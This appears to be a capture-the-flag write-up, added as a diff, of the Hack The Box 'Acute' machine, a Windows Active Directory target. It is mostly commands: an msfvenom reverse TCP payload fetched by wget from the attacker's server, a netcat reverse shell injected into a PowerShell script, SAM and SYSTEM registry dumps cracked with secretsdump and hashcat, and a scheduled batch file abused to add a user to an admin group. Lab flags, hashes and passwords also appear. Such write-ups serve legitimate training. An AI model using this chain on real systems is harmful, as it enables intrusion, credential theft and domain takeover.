@@ -1,0 +1,205 @@
+ip : 10.10.11.145
+
+Domain : atserver.acute.local 
+	 	 acute.local
+
+Nmap
+----
+- nmap found just one open port, port 443 running https
+- we get a bunch of hostnames from the nmap results 
+	atsserver.acute.local
+	acute.local
+
+- we add the hostnames to our /etc/hosts file 
+
+Enumeration
+-----------
+- we visit the hostnames we got one by one 
+- the acute.local doesnt return any result 
+- atsserver.acute.local on the other hand gives us a website 
+- enumerating the website we found a bunch of usernames
+- we convert it into active directory username format  
+	
+	Aileen Wallace
+	awallace 
+	Charlotte Hall
+	chall 
+	Evan Davies
+	edavies 
+	Ieuan Monks
+	imonks
+	Joshua Morgan
+	jmorgan
+	Lois Hopkins
+	lhopkins
+
+- on further enumeration we found a docx file in the about us page
+- we download the docx file and opened it online 
+- we got a remote powershell webshell link from the docx file 
+- we also got a default password
+
+	creds : Password1!
+
+- checking the metadata of the docx file gives a computer name which is required for the remote webshell
+
+	computer name : Acute-PC01
+
+- we all the info we have we can try to login to the webshell
+- notice the change in the error messages when entering different users and computer names
+- tried a bunch of username, password and computer name combinations and one worked 
+
+	edavies : Password1! : Acute-PC01
+
+- finally we login to the web shell 
+- since the web shell is hard to work with we can spawn a reverse shell using msfvenom for a more stable shell in a more familiar environment
+
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=4444 LHOST=10.10.14.57 -f exe > rev.exe 
+
+- now we start msfconsole and use multi/handler 
+- set the options LHOST, LPORT and payload and run
+- we host the rev.exe using a python server
+
+	python3 -m http.server 1234
+
+- we try to get the rev.exe in the current location using wget but failed 
+- this might be because of defender 
+- in the target webshell we move to C:\Utils and wget the rev.exe there 
+
+	wget http://10.10.14.57:1234/rev.exe -outfile r.exe
+
+- we run the rev.exe and we get a shell back in the metasploit listener  
+- we need a powershell session so we run shell command to drop into a regular shell and use the powershell command to get a powershell session
+- we get winpeas on the box and found that there is an active RDP session running on the machine 
+- this can also be found without the help of winpeas using the command 
+
+	qwinsta /server:127.0.0.1
+
+- we turn back to the meterpreter session 
+- meterpreter has an option called screenshare which takes screenshot of the computer its conected to, in this case edavies computer
+- we run the screenshare command multiple times and we got a bunch of valuable information out of it 
+- the user edavies is trying to create a powershell credential object and is trying to connect to atsserver as acute\imonks 
+- we grab the password out of the image 
+
+	creds : w3_4R3_th3_f0rce.
+
+- just like edavies we can create a credential object for atsserver using the following commands
+
+	$pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
+	$cred = New-Object System.Management.Automation.PSCredential("ACUTE\imonks", $pass)
+
+- now when we try to run command using this credential object we get error because imonks only has permission to connect using dc_manage config
+- we add that into the command and tried but failed 
+- but when we try to run a simple command using Invoke-Command it works
+- we test this out by running whoami on the machine using this method
+
+	Invoke-Command -ScriptBlock { whoami } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+  
+- we run the following command to grab the user flag
+
+	Invoke-Command -ScriptBlock { cat C:\users\imonks\desktop\user.txt } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+	user flag : 1096a8806688836b2869b4b8813fa176
+
+- now we run get-command this way to know what all commands we have access to on the machine 
+
+	 Invoke-Command -ScriptBlock { Get-Command } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+- we have some useful commands in our hands including Get-Content (cat) and Set-Content (sc)  
+- we try to view the contents of the program files 
+
+	Invoke-Command -ScriptBlock { ls '\program files' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+- we found a bunch of regular files and one file names keepmeon which is a bit unusual
+- we try to check it out but unfortunately imonks cannot access it
+- along with the user flag we found another file in the desktop which is a powershell script called wm.ps1
+- we can check that out for further information
+- It has credentials for jmorgan back on Acute-PC01
+- we try to gather more info on jmorgan using the command but failed
+
+	net user jmorgan /domain
+ 
+- we check the administrators group and found that jmorgan is a part of it 
+	
+	net localgroup Administrators
+
+- we can try to get a reverse shell out of this 
+- we can use the commands we are allowed to use on the machine to create a new script
+- for the reverse shell we can use the same reverse shell script from before for this too
+- we can upload nc64.exe to the C:\Utils folder using a python server and wget
+- now we can run the following commands to make use of the nc64.exe to push a reverse shell back to our attacking machine   
+
+	Invoke-Command -ScriptBlock { ((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\utils\nc64.exe -e cmd 10.10.14.57 443') | sc -Path ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+	Invoke-Command -ScriptBlock { cat ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+- we start a netcat on our machine to get the reverse shell
+
+	rlwrap -cAr nc -lnvp 443
+
+- run this to initiate a reverse shell
+
+	Invoke-Command -ScriptBlock { C:\users\imonks\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+- we have shell as jmorgan now 
+- as a local administrator on Acute-PC01 jmorgan can make backups for the registry hives  
+- move to C:\Utils and create the backup of these files using the command 
+
+	reg save HKLM\sam sam.bak
+	reg save HKLM\system sys.bak
+
+- we revert back to meterpreter session and download these files  using the command 
+
+	download sam.bak
+	download sys.bak
+
+- now we can use these to dump the hashes using impacket secretsdump
+	
+	secretsdump.py -sam sam.bak -system sys.bak LOCAL
+
+- we got the following hashes 
+
+	Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
+	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
+	Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+ 
+- crack these hashes using hashcat and rockyou.txt
+- the admin hash cracked as Password@123
+
+	creds : Administrator : Password@123
+
+- we create a credential object for the user awallace
+
+	$pass = ConvertTo-SecureString "Password@123" -AsPlainText -Force
+	$cred = New-Object System.Management.Automation.PSCredential("ACUTE\awallace", $pass)  
+	Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami }
+
+- the user awallace can read the keepmeon.bat file from before 
+- reading the bat file reveals that the bat file runs every 5 minutes and is for lois use only
+- back in the word document there was something written about lois that he can add users to become site admin
+- looking at the groups in this domain we found a site admin 
+
+	Invoke-Command -ScriptBlock { net group /domain  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+- we can check the description of site admin for more information 
+
+	Invoke-Command -ScriptBlock { net group Site_Admin /domain  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+- the description says that it must only be used in case of emergencies and can access domain admins 
+- since the .bat file is run by lois and is run every 5 min we can write a script to add awallace to the site admin group
+	
+	Invoke-Command -ScriptBlock { Set-Content -Path '\program files\keepmeon\0xdf.bat' -Value 'net group site_admin awallace /add /domain'} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+	Invoke-Command -ScriptBlock { cat '\program files\keepmeon\0xdf.bat' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+- we can check if awallace is added or not using the command
+	
+	Invoke-Command -ScriptBlock { net group Site_Admin /domain  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+- we can see that awallace has been added to the site admin group 
+- we can read the root flag using the command 
+
+	Invoke-Command -ScriptBlock { cat \users\administrator\desktop\root.txt  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+	root flag : 4b1f2541b9372f810a7d3bfb2686c94f
+  
+	 
